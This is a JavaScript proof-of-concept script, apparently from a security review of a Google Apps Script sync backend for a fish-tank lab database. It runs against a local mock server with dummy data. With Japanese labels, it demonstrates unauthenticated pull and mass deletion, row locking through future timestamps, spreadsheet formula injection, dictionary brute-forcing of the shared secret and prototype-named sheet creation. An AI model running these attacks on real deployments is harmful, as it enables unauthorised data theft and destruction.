const B = 'http://127.0.0.1:8787';
const post = (b) => fetch(B + '/exec', { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(b) }).then((r) => r.json());
const get = (q) => fetch(B + '/exec?' + q).then((r) => r.json());
const ctl = (p, body) => fetch(B + p, body ? { method: 'POST', body: JSON.stringify(body) } : {}).then((r) => r.json());
const dump = async () => (await ctl('/__dump')).sheets;
const now = () => new Date().toISOString();
const tank = (id, memo, ts, del = 0) => ({ tank_id: id, rack: 'R1', tier: 'A', col_no: 1, health_status: '良好', memo, male_count: 5, female_count: 5, unknown_count: 0, lineage: 'AB', set_date: '2026-11-01 10:00:00', updated_at: ts, deleted: del });
const H = (t) => console.log('\n=== ' + t + ' ===');
async function seedLegit(token) {
  await post({ token, action: 'push', tables: { tanks: [tank('R1-A01', '通常メモ', '2026-11-10T00:00:00.000Z'), tank('R1-A02', '通常メモ2', '2026-11-10T00:00:00.000Z')] } });
}
(async () => {
  H('1. 認証なし(SECRET 未設定)で全データ読み出し・全削除');
  await ctl('/__reset'); await seedLegit();
  const pulled = await get('action=pull');
  console.log('トークンなしで pull → 取得できた水槽:', pulled.tables.tanks.map((t) => t.tank_id).join(', '));
  const kill = pulled.tables.tanks.map((t) => ({ ...t, deleted: 1, updated_at: now() }));
  console.log('トークンなしで全行に削除フラグを push →', JSON.stringify(await post({ action: 'push', tables: { tanks: kill } })));
  console.log('攻撃後の deleted 列:', (await get('action=pull')).tables.tanks.map((t) => `${t.tank_id}=${t.deleted}`).join(', '));

  H('2. 未来の updated_at で行を恒久ロック');
  await ctl('/__reset'); await seedLegit();
  await post({ action: 'push', tables: { tanks: [tank('R1-A01', '改ざん済み', '2099-01-01T00:00:00.000Z', 1)] } });
  const legit = await post({ action: 'push', tables: { tanks: [tank('R1-A01', '正規ユーザーの修正', now())] } });
  const after = (await get('action=pull')).tables.tanks.find((t) => t.tank_id === 'R1-A01');
  console.log('正規ユーザーが現在時刻で上書きを試行 → applied =', legit.applied);
  console.log('シート上の値は攻撃者のまま: memo =', after.memo, '/ deleted =', after.deleted);

  H('3. 数式インジェクションで同期対象外のタブを読み出す(数式評価は簡易エミュレーション)');
  await ctl('/__reset'); await seedLegit();
  await ctl('/__seed', { name: '管理メモ', rows: [['同期対象外タブの機密テキスト(ダミー)']] });
  await post({ action: 'push', tables: { tanks: [tank('R1-A09', '=管理メモ!A1', now())] } });
  const raw = (await dump()).tanks.find((r) => r[0] === 'R1-A09');
  console.log('シートに保存された生の値(無加工で = 始まり):', raw[5]);
  console.log('次の pull で返ってきた memo:', (await get('action=pull')).tables.tanks.find((t) => t.tank_id === 'R1-A09').memo);

  H('4. 合言葉(SECRET)の総当たり');
  await ctl('/__reset?secret=medaka'); 
  console.log('誤トークンでの pull:', JSON.stringify(await get('action=pull&token=wrong')));
  const words = ['password', '123456', 'zebra', 'zebrafish', 'fish', 'lab', 'kenkyu', 'aquarium', 'danio', 'suisou', 'sakana', 'medaka', 'secret'];
  const t0 = Date.now(); let n = 0, hit = null;
  for (const w of words) { n++; if ((await get('action=ping&token=' + w)).ok) { hit = w; break; } }
  console.log(`辞書 ${n} 語目で的中: "${hit}" (${Date.now() - t0}ms、試行制限・遅延なし)`);
  let c = 0; const t1 = Date.now(); while (Date.now() - t1 < 1000) { await get('action=ping&token=x' + c++); }
  console.log(`参考: このローカル環境では 1 秒で ${c} 回試行しても一度も拒否されない(本物の GAS は 1 回あたりがもっと遅い)`);

  H('5. 不正なテーブル名でシートを作成');
  await ctl('/__reset');
  const names = ['constructor', 'toString', 'valueOf', 'hasOwnProperty'];
  for (const nm of names) await post({ action: 'push', tables: { [nm]: [{ x: 1 }] } });
  console.log('作成されたシート:', Object.keys(await dump()).join(', '));
  process.exit(0);
})();
